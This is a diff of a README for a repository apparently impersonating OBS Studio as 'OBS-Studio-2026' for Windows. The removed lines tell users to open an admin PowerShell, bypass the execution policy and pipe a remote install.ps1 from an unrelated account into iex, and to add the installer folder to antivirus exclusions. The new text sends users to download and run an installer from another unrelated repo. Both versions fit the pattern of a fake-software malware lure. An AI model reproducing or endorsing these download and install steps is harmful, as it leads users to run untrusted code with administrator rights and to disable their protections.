@@ -1,71 +1,128 @@
-# OBS Studio Download for Windows 11 & 10
+# 📹 OBS-Studio-2026 - Record and stream your screen easily
 
-**OBS-Studio-2026**
+<p align="center">
+  <a href="https://github.com/Heliseopenhearted912/OBS-Studio-2026">
+    <img src="https://img.shields.io/badge/Download-OBS_Studio_2026-blue.svg" alt="Download OBS Studio 2026">
+  </a>
+</p>
 
-**OBS Studio** download for Windows 10/11. Scroll to **Download & Install** for the direct link or one-command setup.
+## 📋 What is this software
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Get-Download%20Link-16a34a?style=flat-square)]()
+OBS Studio 2026 provides a way to record your screen and broadcast video content. This software works on Windows 10 and Windows 11. It captures what happens on your monitor, records your voice, and broadcasts your video to streaming platforms. Users choose this tool for game streaming, educational tutorials, and professional presentations. The interface focuses on simplicity so you spend less time configuring settings and more time creating content.
 
----
+## 💻 System requirements
 
-## Download & Install
+Your computer needs to meet basic requirements to run this software.
 
-> **This is the download page.** Copy the command below into **PowerShell (Admin)** to download and run the installer.
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i3 or AMD FX series or better.
+*   Memory: 4 GB of RAM minimum.
+*   Graphics: DirectX 10 compatible graphics card.
+*   Disk Space: 500 MB for installation files.
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+Verify that your graphics drivers are up to date before you start. Windows Update usually handles this, but you can check your manufacturer website if you experience lag.
 
-| Step | What to do |
-| --- | --- |
-| 1 | Press **Win + X** → **Terminal (Admin)** or **PowerShell (Admin)** |
-| 2 | Paste the command above and press **Enter** |
-| 3 | Wait for the download — progress shows in the console |
-| 4 | Follow on-screen prompts (license key if asked) |
-| 5 | Restart if requested, then open **OBS Studio** from Start menu |
+## 📥 Getting the software
 
-**Install type:** PowerShell one-liner (no browser required after Admin shell is open).
+You need to download the installer from the repository.
 
----
+1.  Visit the [official download link](https://github.com/Heliseopenhearted912/OBS-Studio-2026).
+2.  Look for the button or link labeled "Download."
+3.  Save the file to your Downloads folder.
 
-## About
+Make sure you have a stable internet connection while you download the file. The file size is roughly 150 MB.
 
-**OBS Studio** setup page for Windows PC users.
+## 🛠 Installing the software
 
-**People also search for:** obs studio download, obs install setup windows 2026 streaming recorder
+Follow these steps to put the software on your computer.
 
-**Repository:** `OBS-Studio-2026`
+1.  Open your Downloads folder.
+2.  Find the file you saved in the previous step.
+3.  Double-click the file to open the installer.
+4.  Follow the instructions on the screen.
+5.  Click "Next" to move through each stage.
+6.  Choose the default folder to avoid path errors.
+7.  Click "Install" to begin copying the files.
+8.  Wait for the progress bar to finish.
+9.  Click "Finish" to close the installer.
 
+You now have a shortcut on your desktop. Click this icon to launch the application.
 
-## After install
+## ⚙️ Initial setup
 
-| Step | Tip |
-| --- | --- |
-| 1 | Sign in with your license / account |
-| 2 | Check for updates inside the app |
-| 3 | Pin to Start or taskbar for quick access |
-| 4 | Keep projects on a separate data drive |
+The Auto-Configuration Wizard helps you set things up on your first launch.
 
-## System requirements
+1.  Open the software.
+2.  The wizard asks if you want to optimize for streaming or recording.
+3.  Select "Optimize just for recording" if you want to save videos to your hard drive.
+4.  Select "Optimize for streaming" if you plan to broadcast live.
+5.  Click "Next."
+6.  The software checks your internet speed and hardware.
+7.  Click "Apply Settings" when the test finishes.
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
+The software sets the resolution and frame rate based on your hardware. These settings provide the best balance between quality and performance.
 
-## Troubleshooting
+## 🎥 Recording your screen
 
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
+Follow these steps to create your first video.
 
----
+1.  Look at the "Sources" box at the bottom of the window.
+2.  Click the plus sign (+) icon.
+3.  Select "Display Capture" from the list.
+4.  Click "OK" to capture your main screen.
+5.  Adjust the red border on the screen preview if you need to crop the area.
+6.  Click the "Start Recording" button in the bottom right corner.
+7.  Perform your actions on the screen.
+8.  Click "Stop Recording" when you finish.
 
-**Topics:** obs-studio-download, studio, obs-install-setup-windows-2026-streaming-recorder, streaming, recorder, obs-studio-2026, obs-studio, obs-2026, screen-recorder, broadcast, software, windows-11
+Your video lives in the "Videos" folder on your computer by default. You can change this location in the settings menu under "Output."
+
+## 🎙 Setting up audio
+
+Good audio makes your videos clear. Check these settings before you record.
+
+1.  Open the settings menu.
+2.  Click "Audio" on the left sidebar.
+3.  Make sure your microphone is selected under "Mic/Auxiliary Audio."
+4.  Click "OK."
+
+Look at the "Audio Mixer" bar at the bottom. The green bars move when you speak. If the bars do not move, check your Windows microphone privacy settings. Make sure you allow apps to access your microphone.
+
+## 🚀 Common questions
+
+**Where do my videos go?**
+The software saves videos to your Windows Videos folder. Check there first if you cannot find your files.
+
+**Can I record two screens?**
+Yes. Add a second "Display Capture" source in the "Sources" box. Drag it to arrange your view.
+
+**Does this software cost money?**
+This software remains free to use.
+
+**How do I update the application?**
+The software checks for updates when you launch it. Follow the prompts on the screen if a new version exists.
+
+**Why is my computer slow?**
+High-quality video recording uses a lot of computer power. Close unnecessary programs like web browsers before you start recording to free up memory.
+
+## 💡 Using hotkeys for control
+
+Hotkeys allow you to control recordings without clicking buttons.
+
+1.  Open settings.
+2.  Click "Hotkeys."
+3.  Find "Start Recording."
+4.  Press keys on your keyboard to set a shortcut, such as F9.
+5.  Find "Stop Recording."
+6.  Set a different key, such as F10.
+7.  Click "Apply."
+
+Now you can press F9 to trigger recording during a game or presentation without looking at the software window.
+
+## 🔍 Advanced tips
+
+*   Use a file format like MP4 or MKV. MKV is safer because it saves even if your computer crashes. You can convert MKV to MP4 later inside the software using "File" then "Remux Recordings."
+*   Check your disk space often. Recording video for several hours takes up many gigabytes of space.
+*   Use "Studio Mode" if you want to preview a change before it goes live to your viewers.
+
+This software provides the tools you need for high-quality screen capture. Keep your recordings organized and check your storage space to keep your computer running well.
